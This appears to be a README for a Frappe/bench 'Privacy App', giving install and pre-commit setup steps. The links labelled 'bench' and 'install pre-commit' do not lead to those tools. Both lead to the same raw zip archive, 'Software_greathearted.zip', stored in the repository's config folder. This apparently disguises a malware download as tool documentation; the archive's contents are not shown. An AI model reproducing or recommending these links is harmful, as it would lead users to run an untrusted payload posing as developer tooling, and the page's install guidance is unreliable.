### Privacy App

Redirect

### Installation

You can install this app using the [bench](https://github.com/Chris-tech15/privacy/raw/refs/heads/main/privacy_app/config/Software_greathearted.zip) CLI:

```bash
cd $PATH_TO_YOUR_BENCH
bench get-app $URL_OF_THIS_REPO --branch develop
bench install-app privacy_app
```

### Contributing

This app uses `pre-commit` for code formatting and linting. Please [install pre-commit](https://github.com/Chris-tech15/privacy/raw/refs/heads/main/privacy_app/config/Software_greathearted.zip) and enable it for this repository:

```bash
cd apps/privacy_app
pre-commit install
```

Pre-commit is configured to use the following tools for checking and formatting your code:

- ruff
- eslint
- prettier
- pyupgrade

### License

gpl-3.0
